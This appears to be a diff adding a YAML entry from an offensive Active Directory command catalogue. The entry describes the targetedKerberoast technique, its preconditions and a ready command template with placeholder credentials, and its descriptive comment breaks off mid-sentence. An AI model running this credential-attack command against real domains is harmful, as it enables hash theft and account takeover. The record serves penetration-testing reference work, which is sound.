@@ -1,0 +1,30 @@
+id: wadcoms/targetedkerberoast
+type: technique
+platform: active-directory
+name: targetedKerberoast
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1
+  comment: 'targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print
+    "kerberoast" hashes for user accounts that have a SPN set. This tool brings the following additional
+    feature: for each user without SPNs, it tries to set one (abuse of a write permission'
+references:
+- https://github.com/ShutdownRepo/targetedKerberoast
+tags:
+- active-directory
+- wadcoms
+- kerberos
+- ntlm
